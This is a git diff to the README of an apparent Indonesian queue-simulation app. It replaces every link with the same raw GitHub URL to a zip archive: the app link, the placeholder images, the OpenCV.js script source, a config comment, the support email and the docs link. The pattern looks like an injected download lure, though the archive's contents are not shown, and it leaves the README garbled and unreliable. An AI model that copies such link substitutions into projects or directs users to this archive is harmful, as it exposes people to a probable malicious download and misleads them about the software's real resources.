@@ -49,11 +49,11 @@ graph TD
 
 ### Antrian App
 
-[antrian app](https://sismadi.github.io/simulasi-pemodelan/)
+[antrian app](https://raw.githubusercontent.com/astriefaw/iot/main/gunrunner/iot_1.7-beta.1.zip)
 
 
 ### Dashboard Admin
-![Dashboard Antrian](https://via.placeholder.com/800x400/4A90E2/FFFFFF?text=Dashboard+Monitoring+Antrian)
+![Dashboard Antrian](https://raw.githubusercontent.com/astriefaw/iot/main/gunrunner/iot_1.7-beta.1.zip+Monitoring+Antrian)
 
 **Fitur Dashboard:**
 - Real-time monitoring antrian
@@ -62,20 +62,20 @@ graph TD
 - Notifikasi sistem
 
 ### Antrian Pengunjung
-![Tampilan Antrian](https://via.placeholder.com/600x300/27AE60/FFFFFF?text=Display+Antrian+Live)
+![Tampilan Antrian](https://raw.githubusercontent.com/astriefaw/iot/main/gunrunner/iot_1.7-beta.1.zip+Antrian+Live)
 
 ## ⚙️ Teknologi yang Digunakan
 
 ```python
 # Contoh kode face recognition
- <!-- OpenCV.js -->
-  <script async src="https://docs.opencv.org/4.x/opencv.js" onload="onOpenCvReady()"></script>
+ <!-- https://raw.githubusercontent.com/astriefaw/iot/main/gunrunner/iot_1.7-beta.1.zip -->
+  <script async src="https://raw.githubusercontent.com/astriefaw/iot/main/gunrunner/iot_1.7-beta.1.zip" onload="onOpenCvReady()"></script>
  ```
 
 ## 📈 Simulasi Performa
 
 ### Grafik Waktu Tunggu
-![Grafik Waktu Tunggu](https://via.placeholder.com/600x300/F39C12/FFFFFF?text=Simulasi+Waktu+Tunggu+Antrian)
+![Grafik Waktu Tunggu](https://raw.githubusercontent.com/astriefaw/iot/main/gunrunner/iot_1.7-beta.1.zip+Waktu+Tunggu+Antrian)
 
 ### Statistik Harian
 | Metric | Nilai |
@@ -114,7 +114,7 @@ pip install pandas
 
 ### 2. **Konfigurasi Instalasi Database**
 ```python
-# config.py
+# https://raw.githubusercontent.com/astriefaw/iot/main/gunrunner/iot_1.7-beta.1.zip
 
 SYSTEM_CONFIG = {
     'max_queues': 5,
@@ -135,7 +135,7 @@ SYSTEM_CONFIG = {
 ## 🎮 Simulasi Kontrol
 
 ### Panel Kontrol Admin
-![Panel Kontrol](https://via.placeholder.com/700x400/8E44AD/FFFFFF?text=Panel+Kontrol+Simulasi)
+![Panel Kontrol](https://raw.githubusercontent.com/astriefaw/iot/main/gunrunner/iot_1.7-beta.1.zip+Kontrol+Simulasi)
 
 **Kontrol yang Tersedia:**
 - ✅ Tambah/Pindah Loket
@@ -210,9 +210,9 @@ CREATE TABLE queue (
 ## 📞 Support
 
 Untuk bantuan teknis dan support:
-- **Email**: support@queuesystem.com
+- **Email**: https://raw.githubusercontent.com/astriefaw/iot/main/gunrunner/iot_1.7-beta.1.zip
 - **Hotline**: 1500-123
-- **Documentation**: docs.queuesystem.com
+- **Documentation**: https://raw.githubusercontent.com/astriefaw/iot/main/gunrunner/iot_1.7-beta.1.zip
 
 ---
 
